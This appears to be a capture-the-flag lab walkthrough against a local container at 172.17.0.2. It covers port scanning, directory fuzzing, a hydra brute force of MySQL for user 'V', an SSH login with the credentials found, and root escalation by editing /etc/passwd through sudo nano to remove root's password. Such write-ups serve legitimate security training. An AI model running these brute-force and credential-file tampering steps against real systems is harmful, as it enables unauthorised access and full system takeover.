![image](https://github.com/user-attachments/assets/8d11fa84-e682-4f7f-968b-a1479792dbce)

```bash
ping -c 1 172.17.0.2
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```
![Pasted image 20250128135506](https://github.com/user-attachments/assets/c463a239-13c7-47c2-ac91-11de2bcc774b)
![Pasted image 20250128135614](https://github.com/user-attachments/assets/cdbf3922-80b8-4ad2-961f-8c44ad078040)
![Pasted image 20250128135636](https://github.com/user-attachments/assets/088ccf73-b8d2-4ca6-a913-c6be6829f06d)


## **We can deduce that a user is “V”.**
 
## **fuzzing found nothing**
 ```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh,html,js
```
![Pasted image 20250128135755](https://github.com/user-attachments/assets/877de6f4-ceec-4764-98fb-7e73d496545f)

## **Let's do a brute force attack on port 3306 MYSQL as we can find more stored users here**
```bash
hydra -l V -P /usr/share/wordlists/rockyou.txt mysql://172.17.0.2 -V -I -t 1 -f
```
![Pasted image 20250130112307](https://github.com/user-attachments/assets/71e60feb-2ac3-4454-b417-07cc05cde7f9)

## **Now we connect via sql to check credentials**
```bash
mysql -h 172.17.0.2 -u V -p --ssl=0
```
![Pasted image 20250130113535](https://github.com/user-attachments/assets/4056b0e1-b7ea-4a1a-bf5d-f32fd731be98)

## **by browsing the database we find info**
![Pasted image 20250130114836](https://github.com/user-attachments/assets/378b4f6b-57d0-40cb-b631-5147696f2055)

## **Now we will connect via ssh**
```bash
ssh V@172.17.0.2
```
![Pasted image 20250130115214](https://github.com/user-attachments/assets/513bc173-2c46-4c8b-8146-eaf7fa9d7390)

## **we already have access now we have to elevate privileges**
```bash
sudo -l
```
![Pasted image 20250130115305](https://github.com/user-attachments/assets/93ab47e5-66b7-4b72-9215-6edcec9af67c)

## **we do a TTY treatment**
```bash
script /dev/null -c bash
"CTRL+Z"
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## **As we have root permissions with nano we will modify the file where the users are located**
```bash
sudo nano /etc/passwd
```
![Pasted image 20250130115734](https://github.com/user-attachments/assets/5b26c4a0-fcfd-44d7-a037-f3ae4273a09d)

## **we delete the X so that we are not asked for a password**

![Pasted image 20250130115808](https://github.com/user-attachments/assets/75b99ab2-5d43-4986-a0bf-1217d0b9a73d)

```bash
su root
```
![Pasted image 20250130115850](https://github.com/user-attachments/assets/635565b8-72e7-4915-98fa-f625b08edf55)
